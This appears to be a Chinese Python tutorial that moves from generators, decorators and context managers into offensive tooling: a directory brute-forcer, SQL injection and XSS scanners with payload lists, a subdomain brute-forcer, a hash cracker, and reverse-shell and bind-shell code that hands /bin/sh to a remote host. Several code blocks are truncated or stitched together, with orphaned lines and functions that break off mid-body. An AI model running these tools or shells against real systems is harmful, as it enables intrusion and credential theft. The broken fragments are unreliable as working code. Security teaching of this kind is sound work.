### 1.1 迭代器与生成器

```python
# ===== 迭代器 (Iterator) =====
# 实现了 __iter__() 和 __next__() 方法的对象

class Countdown:
    """从 n 倒数到 1 的迭代器"""
    def __init__(self, start):
        self.current = start

    def __iter__(self):
        return self

    def __next__(self):
        if self.current <= 0:
            raise StopIteration
        self.current -= 1
        return self.current + 1

# 使用
for num in Countdown(5):
    print(num)  # 5, 4, 3, 2, 1

# ===== 生成器 (Generator) =====
# 使用 yield 的函数，返回生成器对象
# 比迭代器更简洁，惰性求值，节省内存

def countdown_gen(start):
    """生成器版本的倒计时"""
    current = start
    while current > 0:
        yield current
        current -= 1

# 使用
for num in countdown_gen(5):
    print(num)  # 5, 4, 3, 2, 1

# ===== 生成器表达式 =====
# 类似列表推导，但返回生成器（惰性求值）

# 列表推导（立即生成，占内存）
squares_list = [x * x for x in range(1000000)]

# 生成器表达式（惰性，不占内存）
squares_gen = (x * x for x in range(1000000))

# 逐个取值
for sq in squares_gen:
    pass  # 处理每个值

# ===== yield from =====
# 委托给子生成器

def nested_gen():
    """嵌套生成器"""
    yield from range(1, 4)    # 1, 2, 3
    yield from ['a', 'b']      # 'a', 'b'
    yield 'end'

list(nested_gen())  # [1, 2, 3, 'a', 'b', 'end']

# ===== 生成器的高级用法：发送数据 =====
# 生成器可以接收外部发送的数据

def echo_gen():
    """接收并回显数据的生成器"""
    while True:
        received = yield        # 暂停，等待外部发送数据
        print(f"收到: {received}")

g = echo_gen()
next(g)                    # 启动生成器，执行到第一个 yield
g.send("Hello")            # 发送数据: 收到: Hello
g.send("World")            # 发送数据: 收到: World
g.close()                  # 关闭生成器

# ===== 实战应用：大文件逐行处理 =====
def read_large_file(filepath):
    """逐行读取大文件，不占用大量内存"""
    with open(filepath, 'r') as f:
        for line in f:
            yield line.strip()

# 处理超大字典文件（密码破解等场景）
def process_dict(filepath, target_hash, hash_func):
    for password in read_large_file(filepath):
        if hash_func(password) == target_hash:
            return password
    return None

# ===== 管道式数据处理 =====
# 多个生成器组成处理管道

def data_source():
    """数据源"""
    for i in range(10):
        yield i

def filter_even(numbers):
    """过滤偶数"""
    for n in numbers:
        if n % 2 == 0:
            yield n

def square(numbers):
    """平方"""
    for n in numbers:
        yield n * n

# 组成管道
pipeline = square(filter_even(data_source()))
result = list(pipeline)  # [0, 4, 16, 36, 64]
```

### 1.2 装饰器

```python
import time
import functools
import logging

# ===== 基本装饰器 =====
def timer(func):
    """计时装饰器"""
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        end = time.time()
        print(f"{func.__name__} 耗时: {end - start:.4f}秒")
        return result
    return wrapper

@timer
def slow_function():
    time.sleep(1)
    return "done"

# ===== 带参数的装饰器 =====
def retry(max_attempts=3, delay=1):
    """重试装饰器"""
    def decorator(func):
        @functools.wraps(func)  # 保留原函数元信息
        def wrapper(*args, **kwargs):
            for attempt in range(max_attempts):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    if attempt < max_attempts - 1:
                        print(f"第{attempt+1}次失败: {e}, {delay}秒后重试...")
                        time.sleep(delay)
                    else:
                        raise
        return wrapper
    return decorator

@retry(max_attempts=3, delay=2)
def network_request(url):
    # 可能失败的网络请求
    import requests
    return requests.get(url, timeout=5)

# ===== 类装饰器 =====
class LogCalls:
    """记录函数调用的类装饰器"""
    def __init__(self, func):
        self.func = func
        self.call_count = 0
        functools.update_wrapper(self, func)

    def __call__(self, *args, **kwargs):
        self.call_count += 1
        print(f"调用 {self.func.__name__} (第{self.call_count}次)")
        return self.func(*args, **kwargs)

@LogCalls
def greet(name):
    return f"Hello, {name}!"

# ===== 多个装饰器叠加 =====
def log_func(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        print(f"调用: {func.__name__}")
        return func(*args, **kwargs)
    return wrapper

def measure_time(func):
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        print(f"耗时: {time.time() - start}")
        return result
    return wrapper

# 执行顺序：log_func 先执行（外层），然后 measure_time
@log_func
@measure_time
def do_something():
    time.sleep(0.5)
    return "ok"

        # 从请求或上下文中获取认证信息
        if not check_authentication():
            raise PermissionError("需要认证")
        return func(*args, **kwargs)
    return wrapper

def check_authentication():
    # 实际的认证检查逻辑
    return True  # 示例

# 2. 输入验证
def validate_input(validator):
    """输入验证装饰器"""
    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            if not validator(*args, **kwargs):
                raise ValueError("输入验证失败")
            return func(*args, **kwargs)
        return wrapper
    return decorator

# 3. 速率限制
def rate_limit(max_calls, period):
    """速率限制装饰器"""
    calls = []

    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            now = time.time()
            # 清理过期的调用记录
            calls[:] = [t for t in calls if now - t < period]

            if len(calls) >= max_calls:
                raise RuntimeError("调用频率超限")

            calls.append(now)
            return func(*args, **kwargs)
        return wrapper
    return decorator

@rate_limit(max_calls=5, period=60)  # 每分钟最多5次
def api_call():
    pass

# 4. 敏感数据脱敏
def mask_sensitive(func):
    """对返回结果中的敏感字段脱敏"""
    @functools.wraps(func)
    def wrapper(*args, **kwargs):
        result = func(*args, **kwargs)
        if isinstance(result, dict):
            if 'password' in result:
                result['password'] = '***'
            if 'token' in result:
                result['token'] = result['token'][:4] + '***'
        return result
    return wrapper
```

### 1.3 上下文管理器

```python
# ===== 基本上下文管理器 =====
# 使用 __enter__ 和 __exit__

class FileManager:
    """文件操作上下文管理器"""
    def __init__(self, filename, mode='r'):
        self.filename = filename
        self.mode = mode
        self.file = None

    def __enter__(self):
        self.file = open(self.filename, self.mode)
        return self.file

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.file:
            self.file.close()
        # 返回 True 表示已处理异常，不向上传播
        # 返回 None/False 表示异常继续传播
        return False

# 使用
with FileManager('test.txt', 'w') as f:
    f.write('Hello')

def timer():

# 6. 超时控制
import signal

class TimeoutError(Exception):
    pass

@contextmanager
def timeout(seconds):
    """超时控制（Unix）"""
    def handler(signum, frame):
        raise TimeoutError("操作超时")

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(seconds)
    try:
        yield
    finally:
        signal.alarm(0)

# 使用
```

```python
class SingletonMeta(type):

    _instances = {}

    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:

# 1. 插件系统
class PluginMeta(type):

    plugins = []

    def __new__(cls, name, bases, attrs):

        if name != 'BasePlugin':  # 不注册基类

class ModelMeta(type):
    """简单 ORM 元类"""
    def __new__(cls, name, bases, attrs):
        if name != 'Model':
            # 自动从属性中提取字段定义
            fields = {}
            for key, value in list(attrs.items()):
                if isinstance(value, Field):
                    fields[key] = value
            attrs['_fields'] = fields
            attrs['_table_name'] = name.lower() + 's'

class InterfaceMeta(type):

class MagicDemo:
```

```python
    # ICMP 类型=8 (Echo), 代码=0, 校验和, ID, 序号
    icmp_type = 8
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = 12345
    icmp_seq = 1

    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                         icmp_id, icmp_seq)

    packet = header + data

        if len(data) % 2:

        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                         icmp_id, icmp_seq)
```

```python
#!/usr/bin/env python3
"""
目录爆破工具
支持：多线程、状态码过滤、自定义字典、进度显示
"""

import requests
import threading
import time
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin


class DirBrute:
    def __init__(self, base_url, dict_file, extensions=None, threads=20, timeout=3):
        self.base_url = base_url.rstrip('/')
        self.dict_file = dict_file
        self.extensions = extensions or ['']
        self.threads = threads
        self.timeout = timeout
        self.found = []
        self.total = 0
        self.scanned = 0
        self.lock = threading.Lock()

        # 过滤的状态码（不报告这些）
        self.filter_codes = {404}

    def load_dict(self):
        """加载字典文件"""
        paths = []
        with open(self.dict_file, 'r', errors='ignore') as f:
            for line in f:
                path = line.strip()
                if path and not path.startswith('#'):
                    # 去掉开头的 /
                    path = path.lstrip('/')
                    # 生成不同后缀的路径
                    for ext in self.extensions:
                        if ext:
                            paths.append(f"{path}.{ext}")
                        else:
                            paths.append(path)
        self.total = len(paths)
        return paths

    def check_path(self, path):
        """检查单个路径"""
        url = f"{self.base_url}/{path}"
        try:
            resp = requests.get(
                url,
                timeout=self.timeout,
                allow_redirects=False,
                headers={'User-Agent': 'DirBuster/1.0'}
            )

            with self.lock:
                self.scanned += 1
                if resp.status_code not in self.filter_codes:
                    # 判断是否有意义
                    if self._is_valid_result(resp, path):
                        self.found.append((path, resp.status_code, len(resp.text)))
                        print(f"  [{resp.status_code}] {len(resp.text):>6}B  /{path}")

                # 进度
                if self.scanned % 100 == 0:
                    progress = self.scanned / self.total * 100
                    print(f"\r进度: {self.scanned}/{self.total} ({progress:.1f}%)", end='')

        except requests.RequestException:
            with self.lock:
                self.scanned += 1

    def _is_valid_result(self, resp, path):
        """判断结果是否有效（排除假阳性）"""
        # 状态码过滤
        if resp.status_code in (400, 404, 500, 502, 503, 504):
            return False

        # 403 是有意义的（说明路径存在）
        if resp.status_code in (200, 301, 302, 403, 405):
            return True

        # 可以根据响应大小进一步过滤
        # 比如很多站点对不存在的路径返回统一的 404 页面
        return resp.status_code < 500

    def run(self):
        """运行扫描"""
        print(f"[*] 目标: {self.base_url}")
        print(f"[*] 字典: {self.dict_file}")
        print(f"[*] 线程: {self.threads}")
        print(f"[*] 后缀: {', '.join(self.extensions) if self.extensions[0] else '无'}")
        print()

        paths = self.load_dict()
        print(f"[*] 共 {self.total} 个路径，开始扫描...\n")

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.check_path, p) for p in paths]
            for future in as_completed(futures):
                pass  # 结果在 check_path 中处理

        elapsed = time.time() - start_time

        print(f"\n\n[*] 扫描完成！")
        print(f"[*] 发现 {len(self.found)} 个可能存在的路径")
        print(f"[*] 耗时: {elapsed:.2f} 秒 ({self.total/elapsed:.0f} 请求/秒)")

        # 按状态码排序输出
        print("\n  状态码   大小    路径")
        print("  " + "-" * 40)
        for path, code, size in sorted(self.found, key=lambda x: (x[1], x[0])):
            print(f"  {code:>4d}   {size:>6}B  /{path}")

        return self.found

    parser.add_argument('url', help='目标 URL')
    parser.add_argument('-w', '--wordlist', required=True, help='字典文件')
    parser.add_argument('-t', '--threads', type=int, default=20, help='线程数')
    parser.add_argument('-e', '--extensions', help='后缀列表，逗号分隔 (如: php,html,txt)')
```

```python
BASIC_TESTS = [
    ("'", "单引号测试"),
    ('"', "双引号测试"),
    ("' OR '1'='1", "OR 恒真测试"),
    ("' AND '1'='2", "AND 恒假测试"),
    ("1' ORDER BY 1-- ", "ORDER BY 测试"),
    ("1 UNION SELECT 1-- ", "UNION 测试"),
]


class SQLiDetector:
    def __init__(self, url, method='GET', data=None, timeout=5):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.timeout = timeout
        self.vulnerable = []

    def test_param(self, param_name, original_value):
        """测试单个参数"""
        issues = []
        baseline = self._make_request(param_name, original_value)

        for payload, desc in BASIC_TESTS:
            test_value = original_value + payload
            response = self._make_request(param_name, test_value)

            if not response:
                continue

            # 1. 基于错误信息的检测
            db_type = self._detect_error(response.text)
            if db_type:
                issues.append({
                    'param': param_name,
                    'payload': payload,
                    'type': 'error_based',
                    'db': db_type,
                    'description': f"{desc} - 触发{db_type}错误"
                })
                break  # 已确认有注入，不再继续

            # 2. 基于布尔逻辑的检测（长度/内容差异）
            if len(baseline.text) != len(response.text):
                # 长度变化可能是盲注特征
                # 需要进一步验证
                pass

        return issues

    def _make_request(self, param_name, param_value):
        """发送请求"""
        try:
            if self.method == 'GET':
                parsed = urlparse(self.url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param_name] = [param_value]
                new_query = urlencode({k: v[0] for k, v in params.items()})
                new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                return requests.get(new_url, timeout=self.timeout,
                                    allow_redirects=False)
            else:
                data = dict(self.data)
                data[param_name] = param_value
                return requests.post(self.url, data=data, timeout=self.timeout,
                                     allow_redirects=False)
        except:
            return None

    def _detect_error(self, response_text):
        """检测 SQL 错误信息"""
        text = response_text.lower()
        for db_type, patterns in SQL_ERRORS.items():
            for pattern in patterns:
                if pattern.lower() in text:
                    return db_type
        return None

    def scan(self):
        """扫描所有参数"""
        print(f"[*] 目标: {self.url}")
        print(f"[*] 方法: {self.method}")
        print()

        # 获取参数列表
        if self.method == 'GET':
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query, keep_blank_values=True)
        else:
            params = {k: [v] for k, v in self.data.items()}

        if not params:
            print("[!] 未找到参数")
            return []

        print(f"[*] 发现 {len(params)} 个参数，开始测试...\n")

        for param_name, values in params.items():
            original_value = values[0] if values else ''
            print(f"  测试参数: {param_name}")

            issues = self.test_param(param_name, original_value)
            if issues:
                for issue in issues:
                    print(f"    [!] 可能存在 SQL 注入!")
                    print(f"        类型: {issue['type']} ({issue['db']})")
                    print(f"        Payload: {issue['payload']}")
                    print(f"        描述: {issue['description']}")
                    self.vulnerable.append(issue)
            else:
                print(f"    [-] 未发现明显注入")

        print(f"\n[*] 扫描完成，发现 {len(self.vulnerable)} 个可能的注入点")
        return self.vulnerable
```

```python
"""

支持：反射型 XSS 检测、参数注入测试

import requests
import urllib.parse
import argparse
from urllib.parse import urlparse, parse_qs, urlencode
from html.parser import HTMLParser


class XSSDetector(HTMLParser):
    """检测响应中是否包含注入的 XSS payload"""

    def __init__(self):
        super().__init__()
        self.contexts = []  # 记录注入点所在上下文
        self.vulnerable = False
        self.inject_marker = None

    def set_marker(self, marker):
        self.inject_marker = marker
        self.vulnerable = False
        self.contexts = []

    def handle_starttag(self, tag, attrs):
        # 检查属性值中是否包含注入标记
        for attr_name, attr_value in attrs:
            if attr_value and self.inject_marker and self.inject_marker in attr_value:
                # 检查是否能逃逸出属性值
                if not attr_value.startswith('"') or not attr_value.endswith('"'):
                    self.vulnerable = True
                    self.contexts.append(f'属性: {tag}[{attr_name}]')

    def handle_data(self, data):
        if self.inject_marker and self.inject_marker in data:
            # HTML 上下文中的注入（最理想的情况）
            self.vulnerable = True
            self.contexts.append('HTML内容')

    def handle_comment(self, data):
        if self.inject_marker and self.inject_marker in data:
            # HTML 注释中注入
            self.contexts.append('HTML注释')


# XSS 测试 Payload
XSS_PAYLOADS = [
    ('<test>', '基础标签注入'),
    ('"><test>', '属性逃逸'),
    ("'><test>", '单引号属性逃逸'),
    ('"><script>alert(1)</script>', 'Script标签'),
    ('"><img src=x onerror=alert(1)>', '事件处理器'),
    ('javascript:alert(1)', 'JavaScript URI'),
    ('<svg onload=alert(1)>', 'SVG onload'),
    ('<body onload=alert(1)>', 'Body onload'),
]


def scan_xss(url, method='GET', data=None, timeout=5):
    """扫描 XSS 漏洞"""
    print(f"[*] 目标: {url}")
    print(f"[*] 方法: {method}")
    print()

    # 获取参数
    if method == 'GET':
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
    else:
        params = {k: [v] for k, v in (data or {}).items()}

    if not params:
        print("[!] 未找到参数")
        return []

    print(f"[*] 发现 {len(params)} 个参数")
    print(f"[*] {len(XSS_PAYLOADS)} 个测试 payload\n")

    detector = XSSDetector()
    vulnerabilities = []

    for param_name, values in params.items():
        original = values[0] if values else ''
        print(f"  测试参数: {param_name}")

        for payload, desc in XSS_PAYLOADS:
            # 使用唯一标记来追踪注入位置
            marker = f"XSS_TEST_{param_name}_MARK"
            test_value = original + marker + payload

            # 发送请求
            try:
                if method == 'GET':
                    parsed = urlparse(url)
                    p = parse_qs(parsed.query, keep_blank_values=True)
                    p[param_name] = [test_value]
                    query = urlencode({k: v[0] for k, v in p.items()})
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                    resp = requests.get(test_url, timeout=timeout,

                    d = dict(data or {})
                    d[param_name] = test_value
                    resp = requests.post(url, data=d, timeout=timeout,
                                         allow_redirects=False)
            except:
                continue

            # 检测注入
            detector.set_marker(marker)
            detector.feed(resp.text)

            if detector.vulnerable:
                print(f"    [!] 可能存在 XSS! ({desc})")
                print(f"        Payload: {payload}")
                for ctx in detector.contexts:
                    print(f"        上下文: {ctx}")
                vulnerabilities.append({
                    'param': param_name,
                    'payload': payload,
                    'description': desc,
                    'contexts': detector.contexts[:]
                })
                break  # 已确认，不再测试该参数的其他 payload

        if not any(v['param'] == param_name for v in vulnerabilities):
            print(f"    [-] 未发现 XSS")

    print(f"\n[*] 扫描完成，发现 {len(vulnerabilities)} 个可能的 XSS 漏洞")
    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(description='XSS 漏洞扫描器')
    parser.add_argument('url', help='目标 URL')
    parser.add_argument('-m', '--method', default='GET', help='请求方法')

    args = parser.parse_args()

    if args.data:
        data = dict(pair.split('=') for pair in args.data.split('&'))
```

```python
#!/usr/bin/env python3
"""
子域名爆破工具
支持：字典爆破、DNS 查询、HTTP 验证
"""

import dns.resolver
import requests
import threading
import argparse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


class SubdomainBrute:
    def __init__(self, domain, dict_file, threads=50, timeout=3):
        self.domain = domain
        self.dict_file = dict_file
        self.threads = threads
        self.timeout = timeout
        self.found = []
        self.lock = threading.Lock()

        # DNS 解析器
        self.resolver = dns.resolver.Resolver()
        self.resolver.timeout = timeout
        self.resolver.lifetime = timeout
        self.resolver.nameservers = [
            '8.8.8.8', '8.8.4.4',  # Google DNS
            '1.1.1.1', '1.0.0.1',  # Cloudflare DNS
            '223.5.5.5', '223.6.6.6',  # 阿里 DNS
        ]

    def load_dict(self):
        """加载子域名字典"""
        subdomains = []
        with open(self.dict_file, 'r', errors='ignore') as f:
            for line in f:
                sub = line.strip()
                if sub and not sub.startswith('#'):
                    subdomains.append(sub)
        return subdomains

    def check_subdomain(self, sub):
        """检查单个子域名"""
        full_domain = f"{sub}.{self.domain}"

        try:
            # DNS A 记录查询
            answers = self.resolver.resolve(full_domain, 'A')
            ips = [str(ans) for ans in answers]

            if ips:
                with self.lock:
                    self.found.append((full_domain, ips))
                    print(f"  [+] {full_domain}  ->  {', '.join(ips[:3])}")
                    return True

        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer,
                dns.resolver.Timeout, dns.exception.DNSException):
            pass

        return False

    def http_probe(self, domain):
        """HTTP 探测，获取标题和状态码"""
        results = {}
        for protocol in ['http', 'https']:
            url = f"{protocol}://{domain}"
            try:
                resp = requests.get(url, timeout=self.timeout,
                                    allow_redirects=True, verify=False)
                # 提取标题
                title = ''
                import re
                match = re.search(r'<title>(.*?)</title>', resp.text, re.IGNORECASE)
                if match:
                    title = match.group(1).strip()

                results[protocol] = {
                    'status': resp.status_code,
                    'title': title[:80] if title else '',
                    'url': resp.url
                }
            except:
                pass

        return results

    def run(self, probe_http=False):
        """运行爆破"""
        print(f"[*] 目标域: {self.domain}")
        print(f"[*] 字典: {self.dict_file}")
        print(f"[*] 线程: {self.threads}\n")

        subdomains = self.load_dict()
        print(f"[*] 共 {len(subdomains)} 个子域名，开始扫描...\n")

        start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.check_subdomain, s) for s in subdomains]
            for future in as_completed(futures):
                pass

        elapsed = time.time() - start_time

        print(f"\n[*] 扫描完成！")
        print(f"[*] 发现 {len(self.found)} 个子域名")
        print(f"[*] 耗时: {elapsed:.2f} 秒")

        # HTTP 探测
        if probe_http and self.found:
            print(f"\n[*] HTTP 探测...\n")
            for domain, ips in self.found:
                info = self.http_probe(domain)
                print(f"  {domain}")
                for proto, data in info.items():
                    print(f"    {proto} [{data['status']}] {data['title']}")

        return self.found


def main():
    parser = argparse.ArgumentParser(description='子域名爆破工具')
    parser.add_argument('domain', help='目标域名')
    parser.add_argument('-w', '--wordlist', required=True, help='字典文件')
    parser.add_argument('-t', '--threads', type=int, default=50, help='线程数')
    parser.add_argument('--http', action='store_true', help='HTTP 探测')
    args = parser.parse_args()

    brute = SubdomainBrute(args.domain, args.wordlist, args.threads)
    brute.run(probe_http=args.http)


if __name__ == '__main__':
    main()
```

```python
#!/usr/bin/env python3
"""
密码哈希破解工具
支持：MD5、SHA1、SHA256、字典攻击、暴力破解
"""

import hashlib
import argparse
import time
import itertools
import string


def detect_hash_type(hash_str):
    """根据长度检测哈希类型"""
    length = len(hash_str)
    hash_types = {
        32: 'MD5',
        40: 'SHA1',
        56: 'SHA224',
        64: 'SHA256',
        96: 'SHA384',
        128: 'SHA512',
    }
    return hash_types.get(length, 'unknown')


def compute_hash(text, hash_type):
    """计算哈希"""
    text_bytes = text.encode('utf-8')
    if hash_type == 'MD5':
        return hashlib.md5(text_bytes).hexdigest()
    elif hash_type == 'SHA1':
        return hashlib.sha1(text_bytes).hexdigest()
    elif hash_type == 'SHA256':
        return hashlib.sha256(text_bytes).hexdigest()
    elif hash_type == 'SHA512':
        return hashlib.sha512(text_bytes).hexdigest()
    else:
        raise ValueError(f"不支持的哈希类型: {hash_type}")


def dictionary_attack(target_hash, dict_file, hash_type=None):
    """字典攻击"""
    if not hash_type:
        hash_type = detect_hash_type(target_hash)

    print(f"[*] 目标哈希: {target_hash}")
    print(f"[*] 检测类型: {hash_type}")
    print(f"[*] 字典文件: {dict_file}\n")

    start_time = time.time()
    count = 0

    with open(dict_file, 'r', errors='ignore') as f:
        for line in f:
            password = line.strip()
            if not password:
                continue

            count += 1
            h = compute_hash(password, hash_type)

            if h.lower() == target_hash.lower():
                elapsed = time.time() - start_time
                print(f"\n[+] 找到密码！")
                print(f"    密码: {password}")
                print(f"    哈希: {h}")
                print(f"    尝试次数: {count}")
                print(f"    耗时: {elapsed:.2f} 秒")
                if elapsed > 0:
                    print(f"    速度: {count/elapsed:.0f} 次/秒")
                return password

            if count % 10000 == 0:
                print(f"\r已尝试: {count}", end='')

    elapsed = time.time() - start_time
    print(f"\n[-] 未找到密码 (尝试了 {count} 个)")
    print(f"[*] 耗时: {elapsed:.2f} 秒")
    return None


def brute_force(target_hash, max_length=4, charset=None, hash_type=None):
    """暴力破解（仅适用于短密码）"""
    if not hash_type:
        hash_type = detect_hash_type(target_hash)

    if charset is None:
        charset = string.digits  # 默认数字

    print(f"[*] 目标哈希: {target_hash}")
    print(f"[*] 检测类型: {hash_type}")
    print(f"[*] 字符集: {charset} ({len(charset)} 个字符)")
    print(f"[*] 最大长度: {max_length}\n")

    start_time = time.time()
    count = 0

    for length in range(1, max_length + 1):
        total = len(charset) ** length
        print(f"[*] 尝试长度 {length} ({total} 种组合)...")

        for combo in itertools.product(charset, repeat=length):
            password = ''.join(combo)
            count += 1
            h = compute_hash(password, hash_type)

            if h.lower() == target_hash.lower():
                elapsed = time.time() - start_time
                print(f"\n[+] 找到密码！")
                print(f"    密码: {password}")
                print(f"    哈希: {h}")
                print(f"    尝试次数: {count}")
                print(f"    耗时: {elapsed:.2f} 秒")
                return password

            if count % 100000 == 0:
                print(f"\r已尝试: {count}", end='')

    elapsed = time.time() - start_time
    print(f"\n[-] 未找到密码 (尝试了 {count} 个)")
    return None


def hash_password(password, hash_type='MD5'):
    """计算密码哈希"""
    h = compute_hash(password, hash_type)
    print(f"密码: {password}")
    print(f"{hash_type}: {h}")
    return h


def main():
    parser = argparse.ArgumentParser(description='密码哈希破解工具')
    subparsers = parser.add_subparsers(dest='command')

    # 字典攻击
    dict_parser = subparsers.add_parser('dict', help='字典攻击')
    dict_parser.add_argument('hash', help='目标哈希')
    dict_parser.add_argument('wordlist', help='字典文件')
    dict_parser.add_argument('-t', '--type', help='哈希类型 (默认自动检测)')

    # 暴力破解
    brute_parser = subparsers.add_parser('brute', help='暴力破解')
    brute_parser.add_argument('hash', help='目标哈希')
    brute_parser.add_argument('-l', '--length', type=int, default=4, help='最大长度')
    brute_parser.add_argument('-c', '--charset', help='字符集 (默认: 数字)')
    brute_parser.add_argument('-t', '--type', help='哈希类型')

    # 计算哈希
    hash_parser = subparsers.add_parser('hash', help='计算哈希')
    hash_parser.add_argument('password', help='密码')
    hash_parser.add_argument('-t', '--type', default='MD5', help='哈希类型')

    args = parser.parse_args()

    if args.command == 'dict':
        dictionary_attack(args.hash, args.wordlist, args.type)
    elif args.command == 'brute':
        brute_force(args.hash, args.length, args.charset, args.type)

    else:
        parser.print_help()
```

```python
#!/usr/bin/env python3
"""
反向 Shell 示例
注意：仅用于安全研究和授权测试
"""

import socket
import subprocess
import os
import sys
import threading


def reverse_shell(host, port):
    """反向 Shell - 连接到攻击者机器执行命令"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))

        # 重定向 stdin/stdout/stderr 到 socket
        os.dup2(sock.fileno(), 0)   # stdin
        os.dup2(sock.fileno(), 1)   # stdout
        os.dup2(sock.fileno(), 2)   # stderr

        # 执行 shell
        subprocess.call(["/bin/sh", "-i"])
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()


def bind_shell(port):
    """Bind Shell - 监听端口等待连接"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(1)

    print(f"[*] 监听端口 {port}...")
    client, addr = server.accept()
    print(f"[*] 收到连接: {addr}")

    # 处理命令
    while True:
        try:
            client.send(b"$ ")
            cmd = client.recv(4096).decode().strip()
            if not cmd or cmd.lower() == 'exit':
                break

            # 执行命令
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            client.send(output.encode())
        except:
            break

    client.close()
    server.close()

def listener(port):

    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', port))
    server.listen(1)

    print(f"[*] 监听端口 {port}，等待连接...")
    client, addr = server.accept()
    print(f"[*] 收到连接: {addr[0]}:{addr[1]}")
    print("[*] 输入命令 (exit 退出)\n")

    def receive_output():
        while True:

                data = client.recv(4096)

                    print("\n[*] 连接断开")
                    break
                print(data.decode(), end='')
            except:
                break

    recv_thread = threading.Thread(target=receive_output, daemon=True)
    recv_thread.start()

    try:
        while True:
            cmd = input()
            if cmd.lower() == 'exit':
                client.send(b'exit\n')
                break
            client.send((cmd + '\n').encode())
    except KeyboardInterrupt:
        pass

    client.close()
    server.close()
```

```python
#!/usr/bin/env python3
"""
API 安全扫描器
检测常见的 API 安全问题
"""

import requests
import json
import argparse
from urllib.parse import urljoin


class APISecurityScanner:
    def __init__(self, base_url, timeout=5):
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'APISecScanner/1.0'
        })

    def check_endpoint(self, path, method='GET', data=None):
        """检查单个 API 端点"""
        url = f"{self.base_url}{path}"
        issues = []

        try:
            if method.upper() == 'GET':
                resp = self.session.get(url, timeout=self.timeout)
            else:
                resp = self.session.post(url, json=data, timeout=self.timeout)

            # 1. 检查是否返回过多信息
            issues.extend(self._check_info_disclosure(resp))

            # 2. 检查 CORS 配置
            issues.extend(self._check_cors(url, resp))

            # 3. 检查认证
            issues.extend(self._check_auth(path, resp))

            # 4. 检查速率限制
            # issues.extend(self._check_rate_limit(path, method, data))

        except requests.RequestException as e:
            issues.append(('info', f'请求失败: {e}'))

        return issues

    def _check_info_disclosure(self, resp):
        """信息泄露检查"""
        issues = []
        text = resp.text.lower()
        headers = {k.lower(): v for k, v in resp.headers.items()}

        # 检查响应头中的服务器信息
        if 'server' in headers:
            server = headers['server']
            if any(v in server.lower() for v in ['apache', 'nginx', 'iis', 'php', 'express']):
                if any(c.isdigit() for c in server):  # 包含版本号
                    issues.append(('medium', f'Server 头泄露版本信息: {server}'))

        # 检查 X-Powered-By
        if 'x-powered-by' in headers:
            issues.append(('low', f'X-Powered-By 头泄露: {headers["x-powered-by"]}'))

        # 检查错误页面是否泄露堆栈信息
        if resp.status_code >= 400:
            leak_patterns = ['traceback', 'stack trace', 'syntax error',
                            'exception', 'at line', 'file:', '.py', '.java']
            for pattern in leak_patterns:
                if pattern in text:
                    issues.append(('high', f'错误页面泄露敏感信息 ({pattern})'))
                    break

        # 检查响应是否包含敏感数据
        sensitive_patterns = ['password', 'secret', 'token', 'api_key', 'private_key']
        for pattern in sensitive_patterns:
            if pattern in text:
                issues.append(('medium', f'响应中可能包含敏感字段: {pattern}'))
                break

        return issues

    def _check_cors(self, url, resp):
        """CORS 配置检查"""
        issues = []

        # 发送带有 Origin 头的请求
        test_origin = 'https://evil.example.com'
        try:
            test_resp = self.session.get(
                url,
                headers={'Origin': test_origin},
                timeout=self.timeout
            )

            acao = test_resp.headers.get('Access-Control-Allow-Origin', '')
            acac = test_resp.headers.get('Access-Control-Allow-Credentials', '')

            if acao == '*':
                issues.append(('medium', 'CORS 配置过于宽松: Allow-Origin = *'))
            elif acao == test_origin:
                if acac.lower() == 'true':
                    issues.append(('high', 'CORS 配置危险: 任意Origin + 允许凭证'))
                else:
                    issues.append(('medium', 'CORS 反射任意 Origin'))

        except:
            pass

        return issues

    def _check_auth(self, path, resp):
        """认证检查"""
        issues = []

        # 如果端点在未认证情况下返回 200，可能缺少认证
        if resp.status_code == 200:
            # 这只是提示，需要结合业务判断
            # issues.append(('info', f'端点 {path} 未认证可访问 (需人工确认)'))
            pass

        # 检查是否缺少安全头
        security_headers = [
            ('X-Content-Type-Options', 'nosniff', 'low'),
            ('X-Frame-Options', None, 'low'),
            ('Content-Security-Policy', None, 'info'),
        ]

